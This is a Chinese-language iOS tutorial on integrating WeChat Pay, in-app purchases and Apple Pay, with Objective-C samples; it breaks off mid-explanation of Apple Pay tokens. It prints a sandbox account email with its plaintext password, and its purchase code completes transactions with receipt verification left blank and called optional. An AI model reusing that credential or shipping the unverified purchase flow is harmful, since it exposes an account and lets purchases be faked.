libWeChatSDK.a│   └── read_me.txt└── lib    ├── ApiXml.h    ├── ApiXml.mm    ├── WXUtil.h    ├── WXUtil.mm    ├── payRequsestHandler.h    └── payRequsestHandler.mm\n\n其中：\nSDKExport文件夹：SDK文件\nlib文件夹：工具类\n\n添加依赖库\nSystemConfiguration.frameworklibz.dyliblibsqlite3.dyliblibc++.dylibCoreTelephony.frameworkCoreGraphics.framework\n\nXcode设置URL scheme\n 在Xcode中，选择你的工程设置项，选中“TARGETS”一栏，在“info”标签栏的“URL type“添加“URL scheme”为你所注册的应用程序id（如下图所示）。\n\n\n在你需要使用微信终端API的文件中import WXApi.h 头文件，并增加 WXApiDelegate 协议。\n// 微信所有的API接口#import &quot;WXApi.h&quot;// APP端签名相关头文件#import &quot;payRequsestHandler.h&quot;@interface AppDelegate ()&lt;WXApiDelegate&gt;@end\n\n要使你的程序启动后微信终端能响应你的程序，必须在代码中向微信终端注册你的id。（如下图所示，在 AppDelegate 的 didFinishLaunchingWithOptions 函数中向微信注册id）。\n- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123;    // Override point for customization after application launch.    //向微信注册    [WXApi registerApp:APP_ID withDescription:@&quot;demo 2.0&quot;];    return YES;&#125;\n\n重写AppDelegate的handleOpenURL和openURL方法：\n- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url&#123;    return [WXApi handleOpenURL:url delegate:self];&#125;- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation&#123;    return [WXApi handleOpenURL:url delegate:self];&#125;\n\n现在，你的程序要实现和微信终端交互的具体请求与回应，因此需要实现WXApiDelegate协议的两个方法：\n-(void) onReq:(BaseReq*)req&#123;    if([req isKindOfClass:[GetMessageFromWXReq class]])    &#123;        // 微信请求App提供内容， 需要app提供内容后使用sendRsp返回        NSString * strTitle = [NSString stringWithFormat:@&quot;微信请求App提供内容&quot;];        NSString * strMsg = @&quot;微信请求App提供内容，App要调用sendResp:GetMessageFromWXResp返回给微信&quot;;        UIAlertView * alert = [[UIAlertView alloc] initWithTitle:strTitle message:strMsg delegate:self cancelButtonTitle:@&quot;OK&quot; otherButtonTitles:nil, nil];        alert.tag = 1000;        [alert show];    &#125;    else if([req isKindOfClass:[ShowMessageFromWXReq class]])    &#123;        ShowMessageFromWXReq *  temp = (ShowMessageFromWXReq*)req;        WXMediaMessage * msg = temp.message;        //显示微信传过来的内容        WXAppExtendObject * obj = msg.mediaObject;        NSString * strTitle = [NSString stringWithFormat:@&quot;微信请求App显示内容&quot;];        NSString * strMsg = [NSString stringWithFormat:@&quot;标题：%@ \\n内容：%@ \\n附带信息：%@ \\n缩略图:%lu bytes\\n\\n&quot;, msg.title, msg.description, obj.extInfo, msg.thumbData.length];        UIAlertView * alert = [[UIAlertView alloc] initWithTitle:strTitle message:strMsg delegate:self cancelButtonTitle:@&quot;OK&quot; otherButtonTitles:nil, nil];        [alert show];    &#125;    else if([req isKindOfClass:[LaunchFromWXReq class]])    &#123;        //从微信启动App        NSString * strTitle = [NSString stringWithFormat:@&quot;从微信启动&quot;];        NSString * strMsg = @&quot;这是从微信启动的消息&quot;;        UIAlertView * alert = [[UIAlertView alloc] initWithTitle:strTitle message:strMsg delegate:self cancelButtonTitle:@&quot;OK&quot; otherButtonTitles:nil, nil];        [alert show];    &#125;&#125;\n\nonReq是微信终端向第三方程序发起请求，要求第三方程序响应。第三方程序响应完后必须调用sendRsp返回。在调用sendRsp返回时，会切回到微信终端程序界面。\n-(void) onResp:(BaseResp*)resp &#123;     NSString * strMsg = [NSString stringWithFormat:@&quot;errcode:%d&quot;, resp.errCode];     NSString * strTitle;     if([resp isKindOfClass:[SendMessageToWXResp class]])     &#123;         strTitle = [NSString stringWithFormat:@&quot;发送媒体消息结果&quot;];     &#125;     if([resp isKindOfClass:[PayResp class]])&#123;         //支付返回结果，实际支付结果需要去微信服务器端查询         strTitle = [NSString stringWithFormat:@&quot;支付结果&quot;];         switch (resp.errCode) &#123;             case WXSuccess:                 strMsg = @&quot;支付结果：成功！&quot;;                 NSLog(@&quot;支付成功－PaySuccess，retcode = %d&quot;, resp.errCode);                 break;             default:                 strMsg = [NSString stringWithFormat:@&quot;支付结果：失败！retcode = %d, retstr = %@&quot;, resp.errCode,resp.errStr];                 NSLog(@&quot;错误，retcode = %d, retstr = %@&quot;, resp.errCode,resp.errStr);                 break;         &#125;     &#125;     UIAlertView * alert = [[UIAlertView alloc] initWithTitle:strTitle message:strMsg delegate:self cancelButtonTitle:@&quot;OK&quot; otherButtonTitles:nil, nil];     [alert show]; &#125;\n\n如果第三方程序向微信发送了sendReq的请求，那么onResp会被回调。sendReq请求调用后，会切到微信终端程序界面\n\n\n应用内支付（In-App Purchase）在应用程序内购买虚拟商品。如果你在App Store上销售的应用程序，将收到支付金额的70％。\n相关资料沙盒测试账号：imetax@hotmail.com 密码：Test1000phone\n支付流程配置App ID\n为应用建立建立一个不带通配符的App ID\n用该App ID生成和安装相应的Provisioning Profile文件。\n\n配置iTunes Connect\n填写相关的税务，银行，联系人信息\n\n参考链接：iOS App提交指南(二)-协议、税务和银行业务\n\n添加一个用于在sandbox付费的测试用户\n\n\n\n用该App ID创建一个新的应用。\n\n创建应用内付费项目，选择付费类型。\n\n\nApp 内购买项目摘要填写  \n\n\n\n\n主要代码实现\n在工程中引入 StoreKit.framework 和 #import &lt;StoreKit/StoreKit.h&gt;\n\n获得所有的付费Product ID列表。这个可以用常量存储在本地，也可以由自己的服务器返回。\n//在内购项目中创建的商品单号#define ProductID_IAP_FTHJ @&quot;com.1000phone.IAPDemo.fthj_purple&quot; // 方天画戟 488元#define ProductID_IAP_XYJ @&quot;com.1000phone.IAPDemo.xyj&quot; // 轩辕剑 6,498元#define ProductID_IAP_JB @&quot;com.1000phone.IAPDemo.jb&quot; // 金币 6元=6金币\n\n\n\n制作界面，展示所有的应用内付费项目。这些应用内付费项目的价格和介绍信息可以从App Store服务器请求，也可以是自己的服务器返回。向App Store查询速度非常慢，通常需要2-3秒钟，最好从服务器请求。\n- (void)createViews&#123;    NSArray * buttonNames = @[@&quot;轩辕剑 6498元&quot;, @&quot;方天画戟 488元&quot;, @&quot;金币6元=6金币&quot;];    __weak typeof(self) weakSelf = self;    [buttonNames enumerateObjectsUsingBlock:^(NSString * buttonName, NSUInteger idx, BOOL * stop) &#123;        UIButton * button = [UIButton buttonWithType:UIButtonTypeSystem];        [weakSelf.view addSubview:button];        button.frame = CGRectMake(100, 100 + idx   * 60, 150, 50);        button.titleLabel.font = [UIFont systemFontOfSize:18];        [button setTitle:buttonName forState:UIControlStateNormal];        // 设置tag值        button.tag = PAY_BUTTON_BEGIN_TAG + idx;        [button addTarget:self action:@selector(buyProduct:) forControlEvents:UIControlEventTouchUpInside];    &#125;];&#125;- (void)buyProduct:(UIButton *) sender&#123;&#125;\n\n\n\n当用户点击了一个IAP项目，我们先查询用户是否允许应用内付费。\n- (void)buyProduct:(UIButton *) sender&#123;    self.buyType = sender.tag - PAY_BUTTON_BEGIN_TAG;    if ([SKPaymentQueue canMakePayments]) &#123;        // 执行下面提到的第5步：        [self requestProductData];        NSLog(@&quot;允许程序内付费购买&quot;);    &#125;    else    &#123;        NSLog(@&quot;不允许程序内付费购买&quot;);        UIAlertView *alerView =  [[UIAlertView alloc] initWithTitle:@&quot;提示&quot;                                                            message:@&quot;您的手机没有打开程序内付费购买&quot;                                                           delegate:nil cancelButtonTitle:NSLocalizedString(@&quot;关闭&quot;,nil) otherButtonTitles:nil];        [alerView show];    &#125;&#125;\n\n我们先通过该IAP的ProductID向AppStore查询，获得SKPayment实例，然后通过SKPaymentQueue的 addPayment方法发起一个购买的操作。\n// 下面的ProductId应该是事先在itunesConnect中添加好的，已存在的付费项目。否则查询会失败。- (void)requestProductData &#123;   NSLog(@&quot;---------请求对应的产品信息------------&quot;);   NSArray *product = nil;   switch (self.buyType) &#123;       case 0:           product = [NSArray arrayWithObject:ProductID_IAP_XYJ];           break;       case 1:           product = [NSArray arrayWithObject:ProductID_IAP_FTHJ];           break;       case 2:           product = [NSArray arrayWithObject:ProductID_IAP_JB];           break;   &#125;   NSSet *nsset = [NSSet setWithArray:product];   SKProductsRequest *request=[[SKProductsRequest alloc] initWithProductIdentifiers: nsset];   request.delegate=self;   [request start];&#125;#pragma mark - SKProductsRequestDelegate// 收到的产品信息回调- (void)productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse *)response&#123;   NSLog(@&quot;-----------收到产品反馈信息--------------&quot;);   NSArray *myProduct = response.products;   if (myProduct.count == 0) &#123;       NSLog(@&quot;无法获取产品信息，购买失败。&quot;);       return;   &#125;   NSLog(@&quot;产品Product ID:%@&quot;,response.invalidProductIdentifiers);   NSLog(@&quot;产品付费数量: %d&quot;, (int)[myProduct count]);   // populate UI   for(SKProduct *product in myProduct)&#123;       NSLog(@&quot;product info&quot;);       NSLog(@&quot;SKProduct 描述信息%@&quot;, [product description]);       NSLog(@&quot;产品标题 %@&quot; , product.localizedTitle);       NSLog(@&quot;产品描述信息: %@&quot; , product.localizedDescription);       NSLog(@&quot;价格: %@&quot; , product.price);       NSLog(@&quot;Product id: %@&quot; , product.productIdentifier);   &#125;   SKPayment * payment = [SKPayment paymentWithProduct:myProduct[0]];   NSLog(@&quot;---------发送购买请求------------&quot;);   [[SKPaymentQueue defaultQueue] addPayment:payment];&#125;//弹出错误信息- (void)request:(SKRequest *)request didFailWithError:(NSError *)error&#123;   NSLog(@&quot;-------弹出错误信息----------&quot;);   UIAlertView *alerView =  [[UIAlertView alloc] initWithTitle:NSLocalizedString(@&quot;Alert&quot;,NULL) message:[error localizedDescription]                                                      delegate:nil cancelButtonTitle:NSLocalizedString(@&quot;Close&quot;,nil) otherButtonTitles:nil];   [alerView show];&#125;-(void) requestDidFinish:(SKRequest *)request&#123;   NSLog(@&quot;----------反馈信息结束--------------&quot;);&#125;\n\n在viewDidLoad方法中，将购买页面设置成购买的Observer。\n- (void)viewDidLoad &#123;    [super viewDidLoad];    [self createViews];    // 监听购买结果    [[SKPaymentQueue defaultQueue] addTransactionObserver:self];&#125;- (void)dealloc&#123;    [[SKPaymentQueue defaultQueue] removeTransactionObserver:self];&#125;\n\n当用户购买的操作有结果时，就会触发下面的回调函数，相应进行处理即可。\n#pragma mark - SKPaymentTransactionObserver// 处理交易结果- (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions &#123;    for (SKPaymentTransaction *transaction in transactions)    &#123;        switch (transaction.transactionState)        &#123;            case SKPaymentTransactionStatePurchased://交易完成                NSLog(@&quot;transactionIdentifier = %@&quot;, transaction.transactionIdentifier);                [self completeTransaction:transaction];                break;            case SKPaymentTransactionStateFailed://交易失败                [self failedTransaction:transaction];                break;            case SKPaymentTransactionStateRestored://已经购买过该商品                [self restoreTransaction:transaction];                break;            case SKPaymentTransactionStatePurchasing:      //商品添加进列表                NSLog(@&quot;商品添加进列表&quot;);                break;            default:                break;        &#125;    &#125;&#125;// 交易完成- (void)completeTransaction:(SKPaymentTransaction *)transaction &#123;    NSString * productIdentifier = transaction.payment.productIdentifier;//    NSString * receipt = [transaction.transactionReceipt base64EncodedString];    if ([productIdentifier length] &gt; 0) &#123;        // 向自己的服务器验证购买凭证    &#125;    // Remove the transaction from the payment queue.    [[SKPaymentQueue defaultQueue] finishTransaction: transaction];&#125;// 交易失败- (void)failedTransaction:(SKPaymentTransaction *)transaction &#123;    if(transaction.error.code != SKErrorPaymentCancelled) &#123;        NSLog(@&quot;购买失败&quot;);    &#125; else &#123;        NSLog(@&quot;用户取消交易&quot;);    &#125;    [[SKPaymentQueue defaultQueue] finishTransaction: transaction];&#125;// 已购商品- (void)restoreTransaction:(SKPaymentTransaction *)transaction &#123;    // 对于已购商品，处理恢复购买的逻辑    [[SKPaymentQueue defaultQueue] finishTransaction: transaction];&#125;\n\n服务器验证凭证(Optional)。如果购买成功，我们需要将凭证发送到服务器上进行验证。考虑到网络异常情况，iOS端的发送凭证操作应该进行持久化，如果程序退出，崩溃或网络异常，可以恢复重试。\n\n\n参考链接\niOS开发内购全套图文教程\niOS应用内付费(IAP)开发步骤列表\niOS内购实现及测试Check List\n\n苹果支付（ Pay）苹果支付是一种在应用内运行的具有隐秘性和安全性非接触式的支付方式。它允许触摸付款，你可以用来购买实体商品和服务。\nApple 不会存储或共享客户的实际信用卡和借记卡卡号，因此商家和 App 开发者无需负责管理和保护实际的信用卡和借记卡卡号。\n\n\n先决条件除了使用 PassKit 框架实施 Apple Pay 之外，您还必须：\n\n通过付款处理机构或网关设置一个帐户。\n\n通过“证书、标识符和描述文件”（“Certificates, Identifiers &amp; Profiles”）注册一个商家 ID。\n\n生成一个 Apple Pay 证书，用于加密和解密付款令牌。\n\n在您的 App 中包括一个 Apple Pay 授权。\n\n遵循“应用审核准则”的第 29 节中列出的要求。\n\n遵循《App 审核准则》(“App Review Guidelines”)第 29 节中列出的要求。\n\n\n支付流程配置 Merchant ID（商家ID）Apple Pay 中的商家 ID 用于标识你能够接受付款。与商家 ID 相关联的公钥与证书用于在支付过程中加密支付信息。要想使用 Apple Pay，你首先需要注册一个商家 ID 并且配置它的证书。\n\n在开发者中心选择证书、标识符及描述文件\n\n在标识符下选择商家 ID，点击右上角的添加按钮(+)。 \n\n输入描述与和标识符，然后继续，检查设置然后点击注册，点击完成。 \n\n为商家 ID 配置证书，在开发者中心选择证书、标识符及描述文件，在标识符下选择商家 ID。从列表中选择商家 ID，点击编辑。  \n\n点击创建证书， 根据提示生成证书签名请求（CSR），选择你的 CSR，然后点击生成下载证书。   \n\n如果你在钥匙串访问 (Keychain Access) 看到警告信息：该证书由一个未知的机构签发或者该证书有一个无效的发行人，请将 WWDR 中级证书 - G2 以及 Apple 根证书 - G2 安装到你的钥匙串中。你可以在 https://www.apple.com/certificateauthority/ 下载到这两个证书。  \n\n\n配置 App ID\n为应用建立建立一个不带通配符的App ID，并勾选上【Apple Pay】。 \n在App IDs列表中编辑该App ID，进行Apple Pay的关联。    \n用该App ID生成和安装相应的Provisioning Profile文件。\n\n代码实现Xcode工程配置在 Xcode 的 【capabilities 面板】中为应用启用 【Apple Pay】功能。在 Apple Pay 这一行中点击开启，然后指定该应用使用的商家 ID 即可。\n判断用户是否能够支付\n调用PKPaymentAuthorizationViewController 的 canMakePayments 方法可以判断当前设备是否支持 Apple Pay。\n // 判断是否支持Apple Payif ([PKPaymentAuthorizationViewController canMakePayments]) &#123;&#125;\n\n 如果 canMakePayments 返回 NO，则设备不支持 Apple Pay。不要显示 Apple Pay 按扭，你可以选择使用其它的支付方式。\n\n调用 PKPaymentAuthorizationViewController 的方法 canMakePaymentsUsingNetworks:(NSArray&lt;NSString *&gt; *)supportedNetworks 判断用户是否能使用你支持的支付网络完成付款。  \n canMakePaymentsUsingNetworks:方法需要传递一个支持的支付网络数组。支付网络包括以下类型：\n extern NSString * const PKPaymentNetworkAmex NS_AVAILABLE(NA, 8_0);\t// 美国运通卡extern NSString * const PKPaymentNetworkChinaUnionPay NS_AVAILABLE(NA, 9_2);\t// 中国银联卡extern NSString * const PKPaymentNetworkDiscover NS_AVAILABLE(NA, 9_0);\t// 美国发现卡extern NSString * const PKPaymentNetworkInterac NS_AVAILABLE(NA, 9_2);\t// 加拿大Interac银行卡extern NSString * const PKPaymentNetworkMasterCard NS_AVAILABLE(NA, 8_0);\t// 万事达卡extern NSString * const PKPaymentNetworkPrivateLabel NS_AVAILABLE(NA, 9_0);\t// 信用卡、借记卡extern NSString * const PKPaymentNetworkVisa NS_AVAILABLE(NA, 8_0);\t// 维萨卡\n\n 如果 canMakePayementsUsingNetworks: 返回 NO，则表示设备支持 Apple Pay，但是用户并没有为任何请求的支付网络添加银行卡。你可以选择显示一个支付设置按扭，引导用户添加银行卡。如果用户点击该按扭，则开始设置新的银行卡流程 (例如，通过调用 openPaymentSetup 方法)。\n // 引导用户添加银行卡// 判断是否能打开卡包if ([PKPassLibrary isPassLibraryAvailable]) &#123;   PKPassLibrary * pk = [[PKPassLibrary alloc] init];   [pk openPaymentSetup];&#125;\n\n // 银行卡类型NSArray * supportedNetworks = @[PKPaymentNetworkChinaUnionPay, PKPaymentNetworkPrivateLabel, PKPaymentNetworkInterac];// 判断是否支持Apple Payif ([PKPaymentAuthorizationViewController canMakePayments]) &#123;   self.paymentButton = [PKPaymentButton buttonWithType:PKPaymentButtonTypeBuy style:PKPaymentButtonStyleWhiteOutline];   [self.paymentButton addTarget:self action:@selector(paymentTapped:) forControlEvents:UIControlEventTouchUpInside];&#125;else if ([PKPaymentAuthorizationViewController canMakePaymentsUsingNetworks:supportedNetworks]) &#123;   // 添加银行卡   self.paymentButton = [[PKPaymentButton alloc] initWithPaymentButtonType:PKPaymentButtonTypeSetUp paymentButtonStyle:PKPaymentButtonStyleWhiteOutline];   [self.paymentButton addTarget:self action:@selector(paymentSetupTapped:) forControlEvents:UIControlEventTouchUpInside];&#125;if (self.paymentButton != nil) &#123;   [self.view addSubview:self.paymentButton];   self.paymentButton.center = CGPointMake(200, 100);&#125;\n\n - (void)paymentSetupTapped:(PKPaymentButton *) sender &#123;   // 判断是否打开卡包   if ([PKPassLibrary isPassLibraryAvailable]) &#123;       PKPassLibrary * pk = [[PKPassLibrary alloc] init];       [pk openPaymentSetup];   &#125;&#125;\n\n显示支付按钮使用 PKPayementButton 方法在初始化支付请求时创建带商标的 Apple Pay 按扭。\n+ (instancetype)buttonWithType:(PKPaymentButtonType)buttonType style:(PKPaymentButtonStyle)buttonStyle;\n\nPKPaymentButtonType按钮类型：\nPKPaymentButtonTypePlain = 0,  // 显示文字【Pay】PKPaymentButtonTypeBuy,\t\t  // 显示文字【Buy with Pay】PKPaymentButtonTypeSetUp NS_ENUM_AVAILABLE_IOS(9_0) // 显示文字【Set up Pay】\n\nPKPaymentButtonStyle样式类型：\nPKPaymentButtonStyleWhite = 0, // 白底黑字PKPaymentButtonStyleWhiteOutline, // 白底黑字，黑色边框PKPaymentButtonStyleBlack\t\t  // 黑底白字\n\n\n创建支付请求支付请求是 PKPayementRequest 类的一个实例。一个支持请求包含用户支付的物品概要清单、可选配送方式列表、用户需提供的配送信息、商家的信息以及支付处理机构。\n- (void)paymentTapped:(PKPaymentButton *) sender &#123;    // 创建支付请求    PKPaymentRequest * paymentRequest = [[PKPaymentRequest alloc] init];    // 配置商家ID    paymentRequest.merchantIdentifier = @&quot;merchant.me.chaosky.applepay&quot;;    // 配置货币代码及国家代码    paymentRequest.currencyCode = @&quot;CNY&quot;;    paymentRequest.countryCode = @&quot;CN&quot;;    // 支持的支付网络，用户能使用类型的银行卡    paymentRequest.supportedNetworks = @[PKPaymentNetworkChinaUnionPay, PKPaymentNetworkPrivateLabel];    // 商家支付能力，商家的支付网络    paymentRequest.merchantCapabilities = PKMerchantCapability3DS | PKMerchantCapabilityEMV;    // 是否显示发票收货地址    paymentRequest.requiredBillingAddressFields = PKAddressFieldNone;    // 是否显示快递地址    paymentRequest.requiredShippingAddressFields = PKAddressFieldAll;    // 自定义联系信息    PKContact *contact = [[PKContact alloc] init];    NSPersonNameComponents *name = [[NSPersonNameComponents alloc] init];    name.givenName = @&quot;天祥&quot;;    name.familyName = @&quot;林&quot;;    contact.name = name;    CNMutablePostalAddress *address = [[CNMutablePostalAddress alloc] init];    address.street = @&quot;天府广场&quot;;    address.city = @&quot;成都&quot;;    address.state = @&quot;四川&quot;;    address.postalCode = @&quot;614100&quot;;    contact.postalAddress = address;    contact.emailAddress = @&quot;chaosky.me@gmail.com&quot;;    contact.phoneNumber = [CNPhoneNumber phoneNumberWithStringValue:@&quot;1234567890&quot;];    paymentRequest.shippingContact = contact;    // 配送方式    paymentRequest.shippingMethods = [self shippingMethodsForContact:contact];    // 默认配送类型    paymentRequest.shippingType = PKShippingTypeShipping;    // 更新邮费    self.selectedShippingMethod = paymentRequest.shippingMethods[0];    [self updateShippingCost:self.selectedShippingMethod];    // 支付汇总项    paymentRequest.paymentSummaryItems = self.summaryItems;    // 附加数据    paymentRequest.applicationData = [@&quot;buyid=123456&quot; dataUsingEncoding:NSUTF8StringEncoding];    // 验证用户支付授权    PKPaymentAuthorizationViewController * paymentAuthVC = [[PKPaymentAuthorizationViewController alloc] initWithPaymentRequest:paymentRequest];    paymentAuthVC.delegate = self;    [self presentViewController:paymentAuthVC animated:YES completion:nil];&#125;// 更新邮费- (void)updateShippingCost:(PKShippingMethod *) shippingMethod &#123;    // 支付汇总项    // 12.75 小计    NSDecimalNumber * subtotalAmount = [NSDecimalNumber decimalNumberWithMantissa:1275 exponent:-2 isNegative:NO];    PKPaymentSummaryItem * subtotal = [PKPaymentSummaryItem summaryItemWithLabel:@&quot;小计&quot; amount:subtotalAmount];    // 2.00 折扣优惠    NSDecimalNumber * discountAmount = [NSDecimalNumber decimalNumberWithMantissa:200 exponent:-2 isNegative:YES];    PKPaymentSummaryItem * discount = [PKPaymentSummaryItem summaryItemWithLabel:@&quot;折扣&quot; amount:discountAmount];    // 邮费    PKPaymentSummaryItem * shippingCost = [PKPaymentSummaryItem summaryItemWithLabel:@&quot;邮费&quot; amount:shippingMethod.amount];    // 总计项    // 总计    NSDecimalNumber *totalAmount = [NSDecimalNumber zero];    totalAmount = [totalAmount decimalNumberByAdding:subtotal.amount];    totalAmount = [totalAmount decimalNumberByAdding:discount.amount];    totalAmount = [totalAmount decimalNumberByAdding:shippingCost.amount];    PKPaymentSummaryItem * total = [PKPaymentSummaryItem summaryItemWithLabel:@&quot;千锋互联&quot; amount:totalAmount];    self.summaryItems = @[subtotal, discount, shippingCost, total];&#125;// 根据用户地址获取配送方式- (NSArray *)shippingMethodsForContact:(PKContact *) contact &#123;    //配置快递方式    NSDecimalNumber * sfAmount = [NSDecimalNumber decimalNumberWithString:@&quot;20.00&quot;];    PKShippingMethod * sfShipping = [PKShippingMethod summaryItemWithLabel:@&quot;顺丰&quot; amount:sfAmount];    sfShipping.identifier = @&quot;shunfeng&quot;;    sfShipping.detail = @&quot;24小时内送达&quot;;    NSDecimalNumber * stAmount = [NSDecimalNumber decimalNumberWithString:@&quot;10.00&quot;];    PKShippingMethod * stShipping = [PKShippingMethod summaryItemWithLabel:@&quot;申通&quot; amount:stAmount];    stShipping.identifier = @&quot;shentong&quot;;    stShipping.detail = @&quot;3天内送达&quot;;    NSDecimalNumber * tcAmount = [NSDecimalNumber decimalNumberWithString:@&quot;8.00&quot;];    PKShippingMethod * tcShipping = [PKShippingMethod summaryItemWithLabel:@&quot;同城快递&quot; amount:tcAmount];    tcShipping.identifier = @&quot;tongcheng&quot;;    tcShipping.detail = @&quot;12小时送达&quot;;    NSArray * shippingMethods = nil;    if ([contact.postalAddress.city isEqualToString:@&quot;成都&quot;]) &#123;        shippingMethods = [NSArray arrayWithObjects:sfShipping, stShipping, tcShipping, nil];    &#125;    else &#123;        shippingMethods = @[sfShipping, stShipping];    &#125;    return shippingMethods;&#125;\n\nPKMerchantCapability枚举类型\n//    PKMerchantCapability3DS                                 = 1UL &lt;&lt; 0,   // 3DS卡（磁条卡）//    PKMerchantCapabilityEMV                                 = 1UL &lt;&lt; 1,   // EMV卡（IC卡）//    PKMerchantCapabilityCredit NS_ENUM_AVAILABLE_IOS(9_0)   = 1UL &lt;&lt; 2,   // 信用卡//    PKMerchantCapabilityDebit  NS_ENUM_AVAILABLE_IOS(9_0)   = 1UL &lt;&lt; 3    // 借记卡\n\nPKAddressField枚举类型\n//    PKAddressFieldNone                              = 0UL,      // 不需要地址//    PKAddressFieldPostalAddress                     = 1UL &lt;&lt; 0, // 完整街道地址，包括名字、街道、城市、地区/省份、邮编、国家//    PKAddressFieldPhone                             = 1UL &lt;&lt; 1, // 电话号码//    PKAddressFieldEmail                             = 1UL &lt;&lt; 2, // 邮箱//    PKAddressFieldName NS_ENUM_AVAILABLE_IOS(8_3)   = 1UL &lt;&lt; 3, // 名字//    PKAddressFieldAll                               = (PKAddressFieldPostalAddress|PKAddressFieldPhone|PKAddressFieldEmail|PKAddressFieldName) // 以上所有都具备\n\n&#x2F;&#x2F; PKShippingType配送类型\n//    PKShippingTypeShipping,   // 第三方配送（默认），如顺丰、申通//    PKShippingTypeDelivery,   // 商家自己配送，如京东、披萨、花店、蛋糕店//    PKShippingTypeStorePickup, // 上门取货//    PKShippingTypeServicePickup // 服务收件，如京东设置的自提点\n\n一系列的支付汇总项由 PKPaymentSummaryItem 类表示支付请求中的不同部分。一个支付请求包括多个支付汇总项，一般包括：小计、折扣、配送费用、税以及总计。如果你没有其它任何额外的费用 (例如，配送或税)，那么支付的总额直接是所有购买商品费用的总和。关于每一项商品的费用的详细信息你需要在应用程序的其它合适位置显示。\n每一个汇总项都有标签和金额两个部分。标签是对该项的可读描述。金额对应于所需支付的金额。一个支付请求中的所有金额都使用该请求中指定的支付货币类型。对于折扣和优惠券，其金额被设置为负值。\n某些场景下，如果在支付授权的时候还不能获取应当支付的费用(例如，出租车收费)，则使用 PKPaymentSummaryItemTypePending 类型做小计项，并将其金额值设置为 0.0。系统随后会设置该项的金额值。\n汇总项列表中最后一项是总计项。总计项的金额是其它所有汇总项的金额的和。总计项的显示不同用于其它项。在该项中，你应该使用你的公司名称作为其标签，使用所有其它项的金额之和作为其金额值。最后，使用 paymentSummaryItems 属性将所有汇总项都添加到支付请求中。\n\n汇总项使用 NSDecimalNumber 类存储金额，并且金额使用 10 进制数表示。如示例代码演示的一样，可以通过显示地指定小数部分与指数部分创建该类的实例，也可以直接使用字符串的方式指定金额。在财务计算中绝大部分情况下都是使用的 10 进制数进行计算的，例如，计算 5% 的折扣。\n\n配送方式的支付汇总项为每一个可选的配送方式创建一个 PKShippingMethod 实例。与其它支付汇总项一样，配送方式也有一个用户可读的标签，例如标准配送或者可隔天配送，和一个配送金额值。与其它汇总项不同的是，配送方法有一个 detail 属性值，例如，7 月 29 日送达或者 24 小时之内送达等等。该属性值说明不同配送方式之间的区别。\n为了在委托方法中区分不同的配送方式，你可以使用 identifier 属性。有些配送方式并不是在所有地区都是可以使用的，或者它们费用会根据配送地址的不同而发生变化。你需要在用户选择配送地址或方法时更新其信息。\n指定应用程序支持的支付处理机制merchantCapabilities 属性值说明应用程序支持的支付处理协议。3DS 协议是须支持的支付处理协议， EMV 是可选的支付处理协议。\n// Supports 3DS onlypaymentRequest.merchantCapabilities = PKMerchantCapability3DS;// Supports both 3DS and EMVpaymentRequest.merchantCapabilities = PKMerchantCapability3DS | PKMerchantCapabilityEMV;\n\n配送信息和账单信息requiredBillingAddressFields 属性和 requiredShippingAddressFields 属性可以设置所需的账单信息和配送信息。\npaymentRequest.requiredBillingAddressFields = PKAddressFieldEmail;paymentRequest.requiredBillingAddressFields = PKAddressFieldEmail | PKAddressFieldPostalAddress;\n\n如果已有最新账单信息以及配送联系信息，你可以直接为支付请求设置这些值。 Apple Pay 会默认使用这些信息。但是，用户仍然可以选择在本次支付中使用其它联系信息。\nPKContact *contact = [[PKContact alloc] init];NSPersonNameComponents *name = [[NSPersonNameComponents alloc] init];name.givenName = @&quot;天祥&quot;;name.familyName = @&quot;林&quot;;contact.name = name;CNMutablePostalAddress *address = [[CNMutablePostalAddress alloc] init];address.street = @&quot;天府广场&quot;;address.city = @&quot;成都&quot;;address.state = @&quot;四川&quot;;address.postalCode = @&quot;614100&quot;;contact.postalAddress = address;contact.emailAddress = @&quot;chaosky.me@gmail.com&quot;;contact.phoneNumber = [CNPhoneNumber phoneNumberWithStringValue:@&quot;1234567890&quot;];paymentRequest.shippingContact = contact;\n\n授权支付支付授权过程是由支付授权视图控制器与其委托合作完成的。支付授权视图控制器做了两件事：  \n\n让用户选择支付请求所需的账单信息与配送信息。\n\n让用户授权支付操作。\n\n\n用户与视图控制器交互时，委托方法会被系统调用，所以在这些方法中你的应用可以更新所要显示的信息。例如在配送地址修改后更新配送价格。在用户授权支付请求后此方法还会被调用一次。\n使用委托方法更新配送方式与配送费用当用户输入配送信息时，授权视图控制器会调用委托的 paymentAuthorizationViewController:didSelectShippingContact:completion: 方法和 paymentAuthorizationViewController:didSelectShippingMethod:completion: 方法。你可以实现这两个方法来更新你的支付请求。\n// 用户更改配送地址- (void)paymentAuthorizationViewController:(PKPaymentAuthorizationViewController *)controller didSelectShippingContact:(PKContact *)contact completion:(void (^)(PKPaymentAuthorizationStatus, NSArray&lt;PKShippingMethod *&gt; * _Nonnull, NSArray&lt;PKPaymentSummaryItem *&gt; * _Nonnull))completion &#123;    self.selectedContact = contact;    NSArray *shippingMethods = [self shippingMethodsForContact:contact];    // 重新计算邮费    self.selectedShippingMethod = shippingMethods[0];    [self updateShippingCost:self.selectedShippingMethod];    completion(PKPaymentAuthorizationStatusSuccess, shippingMethods, self.summaryItems);&#125;// 用户更改配送方式- (void)paymentAuthorizationViewController:(PKPaymentAuthorizationViewController *)controller didSelectShippingMethod:(PKShippingMethod *)shippingMethod completion:(void (^)(PKPaymentAuthorizationStatus, NSArray&lt;PKPaymentSummaryItem *&gt; * _Nonnull))completion &#123;    self.selectedShippingMethod = shippingMethod;    [self updateShippingCost: shippingMethod];    completion(PKPaymentAuthorizationStatusSuccess, self.summaryItems);&#125;\n\n支付被授权时创建支付令牌当用户授权一个支付请求时，支付框架的 Apple 服务器与安全模块会协作创建一个支付令牌。你可以在委托方法 paymentAuthorizationViewController:didAuthorizePayment:completion: 中将支付信息以及其它你需要处理的信息，例如配送地址和购物车标识符，一起发送至你的服务器。这个过程如下所示：\n\n支付框架将支付请求发送至安全模块。只有安全模块会访问令牌化后的设备相关的支付卡号。\n安全模块将特定卡的支付数据和商家信息一起加密(加密后的数据只有 Apple 